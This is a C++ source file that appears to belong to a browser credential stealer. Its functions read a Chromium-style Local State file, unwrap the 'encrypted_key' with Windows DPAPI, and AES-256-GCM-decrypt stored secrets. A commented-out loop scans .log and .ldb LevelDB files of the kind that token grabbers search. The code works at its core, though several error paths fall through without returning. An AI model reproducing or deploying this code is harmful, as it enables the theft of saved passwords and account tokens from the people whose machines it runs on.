#include "crypto.h"

/*

 for (const auto& file_name : std::filesystem::directory_iterator(path)) {
            std::filesystem::path file_path = file_name.path();
            std::string extension = file_path.extension().string();
            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);

            if (extension != ".log" && extension != ".ldb") {
                continue;
            }
        }

*/

std::vector<uint8_t> base64DecodeToBytes(const std::string& base64String) {
    // Initialize the BIO and set it for decoding
    BIO* bio = BIO_new(BIO_f_base64());
    BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);

    // Create a BIO for reading from a memory buffer
    BIO* bioMem = BIO_new_mem_buf(base64String.c_str(), -1);  // Length is determined by null-termination

    // Set the source BIO for the decoding BIO
    BIO_push(bio, bioMem);

    // Calculate the maximum size of the decoded data
    size_t maxLength = base64String.length() * 3 / 4 + 1;
    std::vector<uint8_t> binaryData(maxLength);

    // Perform the Base64 decoding
    int decodedLen = BIO_read(bio, binaryData.data(), maxLength);

    // Clean up BIOs
    BIO_free_all(bio);

    // Check for errors during decoding
    if (decodedLen < 0) {
        std::cerr << "Error during Base64 decoding." << std::endl;
        return {};
    }

    // Resize the vector to the actual size of the decoded data
    binaryData.resize(static_cast<size_t>(decodedLen));

    return binaryData;
}


std::string decryptValue(const std::vector<uint8_t>& buffer, const std::vector<uint8_t>& master_key) {
    // Check that the buffer is large enough to contain the IV and the encrypted data
    if (buffer.size() < 15) {
        throw std::runtime_error("Invalid buffer size");
    }

    // Extract IV and ciphertext from the buffer
    std::vector<uint8_t> iv(buffer.begin() + 3, buffer.begin() + 15);
    std::vector<uint8_t> payload(buffer.begin() + 15, buffer.end());

    EVP_add_cipher(EVP_aes_256_gcm());

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();

    if (!ctx) {
        std::cerr << "Error creating cipher context." << std::endl;
        return "";
    }

    const EVP_CIPHER* cipher = EVP_aes_256_gcm(); // 128

    EVP_DecryptInit_ex(ctx, cipher, nullptr, master_key.data(), iv.data());

    std::vector<uint8_t> decryptedPayload(payload.size() + EVP_CIPHER_block_size(cipher));
    int decryptLen = 0;

    EVP_DecryptUpdate(ctx, decryptedPayload.data(), &decryptLen, payload.data(), payload.size());

    int finalLen = 0;

    EVP_DecryptFinal(ctx, decryptedPayload.data() + decryptLen, &finalLen);

    decryptLen += finalLen;

    EVP_CIPHER_CTX_free(ctx);

    std::string decryptedPass(decryptedPayload.begin(), decryptedPayload.begin() + decryptLen - 16);

    return decryptedPass;
}



std::vector<uint8_t> get_master_key(const std::string& path)
{
    if (!std::filesystem::exists(path))
        //return "Error";
        std::cout << "error";

    std::ifstream file(path);

    if (!file.is_open())
    {
        std::cerr << "Error opening file: " << path << std::endl;
        //return "Error";
    }

    std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
    std::regex pattern("\"encrypted_key\":\"([^\"]*)\"");
    std::smatch match;

    if (fileContents.find("os_crypt") == std::string::npos) {
        //return "Error";
    }

    if (std::regex_search(fileContents, match, pattern)) {
        std::string b64_key = match[1].str();

        //std::string encryptedKey = base64Decode(b64_key);
        std::vector<uint8_t> decodedBytes = base64DecodeToBytes(b64_key);

        if (decodedBytes.size() >= 5) {
            decodedBytes.erase(decodedBytes.begin(), decodedBytes.begin() + 5);
        }

        BYTE* pData = decodedBytes.data();
        DWORD dataSize = static_cast<DWORD>(decodedBytes.size());


        DATA_BLOB inputData;
        inputData.pbData = pData;
        inputData.cbData = dataSize;

        DATA_BLOB outputData;

        if (CryptUnprotectData(&inputData, nullptr, nullptr, nullptr, nullptr, 0, &outputData)) {
            std::vector<uint8_t> decryptedData(outputData.pbData, outputData.pbData + outputData.cbData);
            LocalFree(outputData.pbData);

            /*
            std::cout << "Decrypted data: ";
            for (const auto& byte : decryptedData) {
                std::cout << std::hex << std::setw(2) << std::setfill('0') << static_cast<int>(byte);
            }
            */

            return decryptedData;
        }
    }
    file.close();
}